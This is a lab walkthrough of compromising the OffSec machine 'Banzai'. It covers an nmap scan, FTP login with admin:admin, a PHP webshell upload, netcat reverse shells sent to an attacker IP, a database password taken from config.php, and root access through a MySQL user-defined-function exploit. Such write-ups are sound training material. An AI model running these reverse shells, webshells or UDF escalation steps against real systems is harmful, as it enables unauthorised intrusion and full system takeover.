```sh
nmap -sC -sV -Pn -p- 192.168.56.56
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:09 EST
Nmap scan report for 192.168.56.56
Host is up (0.0010s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open   http       Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.44 seconds

```

Logging into FTP, the credentials admin:admin works.

It appears that this a backend upload to apply to website. Started searching though and found 8295 works.

Uploaded a php reverse shell without success. I then tried an advanced backdoor and then finally a simple backdoor. All from /usr/share/webshells/php

`http://192.168.56.56:8295/simple-backdoor.php?cmd=cat+%2Fhome%2Fbanzai%2Flocal.txt`
This reads the local file.

`http://192.168.87.56:8295/simple-backdoor.php?cmd=nc+-e+/bin/sh+192.168.49.87+21`

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Multiple ports were tested and I found that 21 will allow the connection out.

```ls
config.php
html
cat config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```
Running to check on what mysql is running as
```
ps -aux | grep mysql
```
It is running as root.

```sh
www-data@banzai:/var/www/html$ mysql -u root -pEscalateRaftHubris123
mysql -u root -pEscalateRaftHubris123
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

```

Once way that is possible is Raptor_UDF. This did not work for me in testing and would say that the file ended too soon.
https://www.exploit-db.com/exploits/1518
https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/

```sh
searchsploit -m linux/local/1518.c
gcc -g -c 1518.c -o raptor_udf2.o -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

This was another method.
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql

Verified version with uname -a and downloaded the udf file for x64.
Uploaded using the FTP using admin:admin. 

```sh
mysql -u root -p EscalateRaftHubris123
create table test(line blob);
insert into test values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
select * from test into dumpfile '/usr/lib/mysql/lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
select sys_exec('nc -e /bin/sh 192.168.45.5 22');
```

Started nc -lvnp 22
Got a reverse shell on port 22 and was able to open proof.txt as root.
